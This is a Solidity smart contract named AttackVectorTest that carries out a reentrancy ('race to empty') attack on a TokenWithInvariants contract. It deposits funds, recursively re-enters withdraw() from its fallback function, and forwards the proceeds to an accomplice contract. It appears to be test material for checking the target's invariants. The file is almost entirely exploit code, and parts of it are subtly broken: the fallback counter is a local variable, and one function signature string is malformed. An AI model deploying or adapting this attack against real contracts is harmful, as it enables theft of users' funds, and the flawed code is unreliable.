pragma solidity ^0.4.23;

contract AttackVectorTest {
    address private _contraddr; //the TokenWithInvariants contract to be attacked
    address private _owner;
    //contract B which will execute another race to empty attack
    address private _contractB; 
    bool private safety_mode_on;
    uint private last_received;
    
    constructor(address _toAttack, address B) public{
        _contraddr = address(_toAttack);
        _contractB = address(B);
        _owner = msg.sender;
        safety_mode_on = true;
        last_received = 0;
    }
    
    function safetyModeOn() public view returns (bool) {
        return safety_mode_on;
    }
    
    function setAttaccContract(address _addr) public {
        require(msg.sender == _owner);
        _contraddr = address(_addr);
    }
    
    function setAccompliceBContract(address _addr) public {
        require(msg.sender == _owner);
        _contractB = address(_addr);
    }
    
    function depositToTWI(uint value) payable public {
        _contraddr.call.value(msg.value)(bytes4(keccak256("deposit(uint256)")), value);
        
    }
    
    function toggleSafetyMode() public returns (bool) {
        require(msg.sender == _owner);
        safety_mode_on = !safety_mode_on;
        return safety_mode_on;
    }
    
    function withdraw() public {
        _contraddr.call(bytes4(keccak256("withdraw()")));
    }
    
    function killswitch() public {
        require(msg.sender == _owner);
        selfdestruct(_owner);
    }
    function () public payable {
        uint in_count;
        if (!safety_mode_on) { 
            if (in_count == 0){
                in_count = 1;
                last_received = msg.value;
                // recursively call withdraw on TokenWithInvariants
                _contraddr.call(bytes4(keccak256("withdraw()"))); 
            }
            else{
                // reset
                in_count = 0;
                // call transfer on TWI to contract B
                _contraddr.call(bytes4(keccak256("transfer(address,uint256")), _contractB, last_received);
            }
        }
    }
}